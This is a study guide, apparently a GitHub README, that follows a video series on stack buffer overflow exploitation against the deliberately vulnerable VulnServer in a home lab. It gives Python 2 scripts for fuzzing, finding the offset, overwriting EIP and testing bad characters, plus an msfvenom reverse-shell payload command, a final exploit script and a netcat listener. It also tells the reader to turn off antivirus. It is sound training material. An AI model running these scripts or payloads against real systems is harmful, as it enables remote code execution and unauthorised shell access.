# Buffer Over Flow
these notes come from watching the Cyber Mentors Buffer Overflow Videos on youtube 
1. https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
2. https://www.youtube.com/watch?v=ncBblM920jw
3. https://samsclass.info/127/127_2020.shtml

All python code here is written in python 2 because that is what comes with kali by default. 
## Steps:
1. Spiking- Finding a vulnerable part of a program.
2. Fuzzing- send a bunch of characters at a program and see if we can break it.
3. Finding the offset- Find the point fuzzing broke the program.
4. Overwrite the EIP Register- using the offset found in the previous step.
5. Finding Bad Characters- so that our exploit doesn’t do something unexpected. 
6. Finding the Right Module- looking for a module with no memory protection to abuse. 
7. Generating the shell code- use MSFVenom to generate the shellcode

## Tools:
### Windows:
1. Windows 10, for debugging and being attacked. https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise
2. Immunity Debugger https://www.immunityinc.com/products/debugger/
3. Vulnerable software: VulnServer (thegreycorner) https://github.com/stephenbradshaw/vulnserver
4. mona.py from https://github.com/corelan/mona
5. Python 2.7 (can be downloaded and installed by Immunity Debugger)

### Linux:
1. Kali Linux, for attacking the Vulnerable Software. https://www.kali.org/downloads/
2. MSFVenom to generate the shellcode. (Comes installed in Kali)

## Spiking: 

#### Windows 10: 
Turn off real time protection, under virus and threats (VulnServer won’t run otherwise). 
Start VulnServer as Administrator.
Start Immunity Debugger as Administrator (or else it can’t see VulnServer).
in Immunity, from the file menu click:
```
File > Attach > VulnServer
Hit the PLAY button at the top.
```
Get Windows IP address by opening CMD and running: ipconfig

#### Kali Linux:
use NetCat to connect
```
# nc -nv <Winodw-IP>
```
for this example you will see a prompt that says to use HELP for more info.
use HELP to find out what commands are available and exit out. 

to look for a flawed program use the command: generic_send_tcp and make a Spike script.

```
Stats.spk:
s_readline():			
s_string(STATS :):		# STATS is the command we are trying to break here. 
s_string_variable(“0”):	
```

```
# generic_send_tcp <Windows-IP> <port#> stats.spk 0 0
```
Check Immunity Debugger to see when it caused an error. 
Each time an error is cause you will need to restart both VulnServer and Immunity Debugger as administrator, or you may have some issues. 
Check the EBP for 41414141 meaning it over wrote it will A’s to verify we can buffer overflow. You may also see that you over wrote the ESP and EIP. 


If you look at the EAX register ASCII you will notice 
```
EAX 0102F1E8 ASCII TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

This tells us that when we Fuzz the program we will have to use 
```
TRUN /.:/
```

## Fuzzing: 

#### Kali Linux: 

create python script fuzz.py

```
#!/usr/bin/python

import sys, socket
from time import sleep

buffer = 'A' * 100

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.90',9999))                    # change to match the IP and port# of the application you are fuzzing

            s.send(('TRUN /..:/' + buffer))                     # change TRUN to be the command you are Fuzzing
            s.close()
            sleep(1)
            buffer = buffer + "A"*100

    except: 
            print "Fuzzing crashed at %s bytes" % str(len(buffer))
            sys.exit()
```


Make fuzz.py executable (chmod +X fuzz.py) or run in python terminal
Run fuzz.py (make sure VulnServer and Immunity are running on Windows 10)
fuzz.py might not stop on its own right away. 
If you see VulnServer crash in Immunity you can close out of fuzz.py (ctrl + c)

#### Windows 10: 
look in Immunity (may or may not have over written the EIP). 


## Finding the Offset:

#### Kali Linux:
```
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <"Fuzzing crashed at %s bytes">
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

after running the command copy the output and use it to modify the previous python script. 

create python script offset.py

```
#!/usr/bin/python

import sys, socket

offset = ""             # paste in here the output from offset.py

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.90',9999))                    #change to match the IP and port# of the application you are fuzzing

            s.send(('TRUN /..:/' + offset))                     #change TRUN to be the command you are Fuzzing
            s.close()

    except: 
            print "Error connecting to Server."
            sys.exit()
```

Run the script and go check Immunity Debugger in Windows

#### Windows 10: 
in Immunity Debugger copy the EIP info (should be hexadecimal numbers). 

#### Kali Linux: 
```
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <"Fuzzing crashed at %s bytes"> -q <EIP info>
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```
[*] Exact match found at offset 2003		<== needed so we can control the EIP

## Overwrite the EIP:

#### Kali Linux: 
create python script overwrite.py

```
#!/usr/bin/python

import sys, socket

shellcode = "A" * 2003 + "B" * 4    # 2003 is the "[*] Exact match found at offset number from offset.py"

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.90',9999))                    #change to match the IP and port# of the application you are fuzzing
2003
            s.send(('TRUN /..:/' + shellcode))                     #change TRUN to be the command you are Fuzzing
            s.close()

    except: 
            print "Error connecting to Server."
            sys.exit()
```


#### Windows 10: 
check Immunity Debugger and verify that the EIP is overwritten with 4x B in hex (42424242)
this verifies you can control the EIP 


## Finding Bad Characters:
get badchars variable from: https://web.archive.org/web/20200320175929/http://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
remove \x00 as it will always be a "bad character" and is used to terminate programs in C. 

create python script badchars.py

```
#!/usr/bin/python

import sys, socket

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4  + badchars  # 2003 is the "[*] Exact match found at offset number from offset.py"

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.90',9999))                    #change to match the IP and port# of the application you are fuzzing

            s.send(('TRUN /..:/' + shellcode))                     #change TRUN to be the command you are Fuzzing
            s.close()

    except: 
            print "Error connecting to Server."
            sys.exit()
```
      
run the badchars.py script

#### Windows 10: 
look at the Hex dump

Immunity Debugger Registers window

	right click on ESP > Follow in Dump

in Dump window you will go through the HEX DUMP looking to see if everything matches what you sent to the program in badchars.py. Any missing or replaced characters are 
considered bad characters and should be removed from the final part. 


## Finding the Right Module:

#### Windows 10:
mona module can be used with Immunity Debugger to help us find the module or DLL that has no memory protection. 

Download mona.py from https://github.com/corelan/mona 

Put it in the folder “C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands”

In Immunity Debugger the search bar at the very bottom type:

```
!mona modules
under module information we are looking for all “False” labels and attached to the program we have been trying to exploit. 
```

#### Kali Linux:
##### look up assembly code for jmp esp
##### FFE4
##### \xff\xe4
```
# locate nsam_shell
copy location address. Then run it.
# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP			# this is what we enter to get the code for jumping to the ESP
00000000 FFE4		jmp esp
nasm > exit
```

#### Windows 10:
In Immunity Debugger the search bar at the very bottom type:
```
!mona find -s “\xff\xe4” -m <name of the DLL or module>
you will get back a list of return addresses. Start with one that shows false for all the memory protection. 
```

#### Kali Linux:
create python script overflow.py

```
#!/usr/bin/python

import sys, socket

# 625011af    <==return address from mona in Immunity Debugger 
shellcode = "A" * 2003 + "\xaf\x11\x50\x62"     # adding the return address in little Endian format used for x86 arch

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.90',9999))                    #change to match the IP and port# of the application you are fuzzing

            s.send(('TRUN /..:/' + shellcode))                     #change TRUN to be the command you are Fuzzing
            s.close()

    except: 
            print "Error connecting to Server."
            sys.exit()
```

#### Windows 10:
In Immunity, go back to the main screen and click bluish black arrow at the top

should pop up a window saying expression to follow. Type in the register from before: 

625011af

hit ok

In the upper left window it should show our jump point at the top, like so:

625011AF  FFE4		JMP ESP

Hit F2, this will set a break point and change the 625011AF blue

hit play and go back to Kali and run overflow.py, when you come back to Immunity you should see Breakpoint at essfunc.625011AF


## Generating the Shell Code:

#### Kali Linux:
```
msfvenom -p windows/shell_reverse_tcp LHOST=<Kali-IP> LPORT=<Kali-Port#> EXITFUNC=thread -f c -a x86 -b “\x00”

1. -p: payload; create a windows reverse shell
2. LHOST=<Kali IP>; Listening Host
3. LPORT=<Kali Port#>; 
4. EXITFUNC=thread
5. -f: for file type; creating a C program 
6. -a: architecture; creating for 32bit (x86)
7. -b: for bad character; add in any characters you would like to exclude. 
```
**Note: I had to change the command a little to get it to work for me, which is the command you see below.**
```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.16 LPORT=4444 EXITFUNC=thread -f c -b '\x00'
```

This will out put the shellcode we need to add to our python script. Take note of the payload size incase it is to big for our uses if doing lots of exploit development. 

create python script bof.py
```
#!/usr/bin/python

import sys, socket

overflow = ("")         # copy over the shell code from msfvenom

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow      # fill memory with 2003 A's, add jump instruction, add nop padding, add shellcode to run 

while True:
    try: 
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('192.168.1.90',9999))                    #change to match the IP and port# of the application you are fuzzing

            s.send(('TRUN /..:/' + shellcode))                     #change TRUN to be the command you are Fuzzing
            s.close()

    except: 
            print "Error connecting to Server."
            sys.exit()
```

open a terminal and run NetCat listen for the reverse shell. 

```
# nc -nvlp <port#> 
listening on [any] 4444 …
```

#### Windows 10:
Make sure VulnServer is running as admin, Immunity shouldn’t be needed anymore. 

#### Kali Linux:
run bof.py

check terminal running NetCat and you should have a connection

## More Practice:
https://download.vulnhub.com/brainpan/Brainpan.zip


# Additional resources for learning Pwn
**[Deusx64](https://deusx64.ai)**<br>
**[Exploit Education](https://exploit.education)**<br>
**[Pwn.College](https://pwn.college)**<br>
**[ROPEmporium](https://ropemporium.com)**<br>
**[How2Heap](https://github.com/shellphish/how2heap)**<br>
**[NightMare](https://guyinatuxedo.github.io)**<br>
**[Ir0nstone](https://ir0nstone.gitbook.io/notes/types/stack)**<br>
**[PinkDraconian](https://www.youtube.com/playlist?list=PLeSXUd883dhjmKkVXSRgI1nJEZUDzgLf\_)**<br>
**[LiveOverflow](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)**<br>
**[More](https://github.com/Crypto-Cat/CTF#readme)**
